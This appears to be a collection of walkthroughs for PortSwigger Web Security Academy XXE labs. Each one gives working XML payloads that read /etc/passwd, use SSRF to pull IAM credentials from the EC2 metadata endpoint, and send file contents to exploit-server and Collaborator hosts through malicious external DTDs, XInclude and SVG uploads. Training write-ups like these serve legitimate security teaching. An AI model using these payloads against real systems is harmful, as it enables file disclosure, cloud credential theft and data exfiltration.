
# Exploiting XXE using external entities to retrieve files

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.

---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe



![img](images/Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files/1.png)

---------------------------------------------


The request to check the stcok of a product uses a XML object:



![img](images/Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files/2.png)


Tha payload used is:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```



![img](images/Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files/3.png)

# Exploiting XXE to perform SSRF attacks

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe



![img](images/Exploiting%20XXE%20to%20perform%20SSRF%20attacks/1.png)

---------------------------------------------

Using the simple payload you get a value after invalid product, in this case “latest”:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```



![img](images/Exploiting%20XXE%20to%20perform%20SSRF%20attacks/2.png)


Adding this value to the url you end up with the following payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```



![img](images/Exploiting%20XXE%20to%20perform%20SSRF%20attacks/3.png)

# Blind XXE with out-of-band interaction

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe/blind



![img](images/Blind%20XXE%20with%20out-of-band%20interaction/1.png)

---------------------------------------------


Using the same payload as the last lab but changing the url for a Collaborator url we have this payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://3vzysj2gzhhn64eedhoks71zjqphd71w.oastify.com"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```



![img](images/Blind%20XXE%20with%20out-of-band%20interaction/2.png)


And there are requests in the Collaborator tab:



![img](images/Blind%20XXE%20with%20out-of-band%20interaction/3.png)

# Blind XXE with out-of-band interaction via XML parameter entities

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

---------------------------------------------

Reference: https://portswigger.net/web-security/xxe/blind

---------------------------------------------

Generated link: https://0a8300cf04a26be4802b0864005700e8.web-security-academy.net/

Original request:

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>
		1
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

We want to add something like this example from the reference:

``` 
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLABORATOR_URL"> %xxe; ]>
```

We will test the following payload:

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://q6x580qbz3i8x9wutkq9i4bg97fy3ord.oastify.com"> %xxe; ]>		
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```



![img](images/Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities/1.png)


We get requests in Burp Collaborator:



![img](images/Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities/2.png)

# Exploiting blind XXE to exfiltrate data using a malicious external DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.

---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe/blind



![img](images/Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD/1.png)

---------------------------------------------


First we store the malicious DTD in the exploit server:

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0ad2004004843a168182a2f5018800b6.exploit-server.net/?x=%file;'>">
%eval;
%exfiltrate;
```



![img](images/Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD/2.png)


Then we send the XXE payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ad2004004843a168182a2f5018800b6.exploit-server.net/malicious.dtd"> %xxe;]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```



![img](images/Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD/3.png)


We get an error but the hostname is received:



![img](images/Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD/4.png)

# Exploiting blind XXE to retrieve data via error messages

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe/blind



![img](images/Exploiting%20blind%20XXE%20to%20retrieve%20data%20via%20error%20messages/1.png)

---------------------------------------------

First we store the malicious DTD in the exploit server:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```



![img](images/Exploiting%20blind%20XXE%20to%20retrieve%20data%20via%20error%20messages/2.png)


Then we send the XXE payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a89003a032db21e8245e131014c005d.exploit-server.net/malicious.dtd"> %xxe;]>
<stockCheck>
	<productId>
		1
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```




![img](images/Exploiting%20blind%20XXE%20to%20retrieve%20data%20via%20error%20messages/3.png)

# Exploiting XInclude to retrieve files

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.

Hint: By default, XInclude will try to parse the included document as XML. Since /etc/passwd isn't valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior.


---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe



![img](images/Exploiting%20XInclude%20to%20retrieve%20files/1.png)

---------------------------------------------

Initial payload:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Initial POST request:



![img](images/Exploiting%20XInclude%20to%20retrieve%20files/2.png)


It is possible to retieve the file's content URL-encoding the payload and sending it inside the “productId” parameter:

```
POST /product/stock HTTP/2
...

productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
```



![img](images/Exploiting%20XInclude%20to%20retrieve%20files/3.png)

# Exploiting XXE via image file upload

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

Hint: The SVG image format uses XML.


---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/1.png)

---------------------------------------------




![img](images/Exploiting%20XXE%20via%20image%20file%20upload/2.png)


The avatar is sent within the comment:



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/3.png)


We will change the "filename" to “test.svg” and the "Content-Type" to “image/svg+xml”, and then change the content to an XXE payload. 

First I tested if it is possible to generate an HTTP request to the Collaborator url:

```
-----------------------------39756462762517607865870849077
...
Content-Disposition: form-data; name="avatar"; filename="test.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://w63x7veqbibnsmco4xvkaucwyn4es4gt.oastify.com"> ]><stockCheck><productId>&xxe;	</productId><storeId>1</storeId></stockCheck>
...
```



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/4.png)


The server returns a 500 error code but the connections were generated:



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/5.png)


And in the HTML response we can read this:



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/6.png)


I got to this payload, which generates a 302 code and the comment is created in the post:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```


And you can see the hostname ("81da8cd96d3a") in the image:



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/7.png)



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/8.png)
